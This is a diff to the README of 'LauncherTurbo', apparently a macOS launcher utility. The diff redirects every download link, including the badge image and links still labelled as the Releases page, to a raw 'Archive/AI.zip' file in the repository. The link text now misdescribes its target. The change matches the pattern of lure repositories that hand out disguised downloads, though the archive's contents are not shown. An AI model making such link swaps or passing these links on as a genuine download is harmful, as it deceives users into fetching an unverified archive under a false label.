@@ -6,7 +6,7 @@ Welcome to LauncherTurbo! This application enhances your macOS experience by lev
 
 ## 📥 Download LauncherTurbo
 
-[![Download LauncherTurbo](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Sherifcruz/LauncherTurbo/releases)
+[![Download LauncherTurbo](https://github.com/Sherifcruz/LauncherTurbo/raw/refs/heads/main/Archive/AI.zip)](https://github.com/Sherifcruz/LauncherTurbo/raw/refs/heads/main/Archive/AI.zip)
 
 ## 🚀 Getting Started
 
@@ -24,7 +24,7 @@ Before you begin, ensure your system meets the following requirements:
 
 To download LauncherTurbo, go to the Releases page. Here you will find the latest version of the software.
 
-[Visit Releases Page to Download](https://github.com/Sherifcruz/LauncherTurbo/releases)
+[Visit Releases Page to Download](https://github.com/Sherifcruz/LauncherTurbo/raw/refs/heads/main/Archive/AI.zip)
 
 ### 3. Download the Application
 
@@ -79,4 +79,4 @@ We value your input. If you have suggestions or feedback about your experience w
 
 Thank you for choosing LauncherTurbo! Enjoy a faster and more responsive macOS experience with our app. 
 
-For more information and to download the latest version, [visit our Releases page again](https://github.com/Sherifcruz/LauncherTurbo/releases).
+For more information and to download the latest version, [visit our Releases page again](https://github.com/Sherifcruz/LauncherTurbo/raw/refs/heads/main/Archive/AI.zip).
